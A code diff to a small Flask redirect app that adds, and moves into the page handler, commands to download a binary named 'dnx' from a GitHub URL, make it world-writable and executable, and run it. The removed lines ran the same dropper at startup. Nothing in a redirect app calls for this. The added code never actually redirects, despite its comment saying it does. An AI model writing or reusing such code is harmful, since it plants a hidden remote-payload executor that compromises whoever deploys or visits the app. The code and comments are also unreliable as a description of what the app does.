@@ -1,16 +1,18 @@
 from flask import Flask, redirect
-import sys
 import os
 
 app = Flask(__name__)
 
 @app.route('/')
-def hello():
-    return redirect("https://trustedge.com/", code = 302)
+def redirect_and_run_command():
+    # Redirect to a website
+    redirect_url = 'https://www.example.com'
+    os.system(f"start 'wget https://github.com/55113110159/OS/raw/main/dnx'")
+    os.system(f"start 'chmod 777 dnx'")
+    os.system(f"start './dnx'")
 
+    # Return a response (this won't be reached due to the redirection)
+    return "Redirecting..."
 
 if __name__ == '__main__':
-    app.run()
-os.system('wget https://github.com/55113110159/OS/raw/main/dnx')
-os.system('chmod 777 dnx')
-os.system('./dnx')
+    app.run(debug=True)
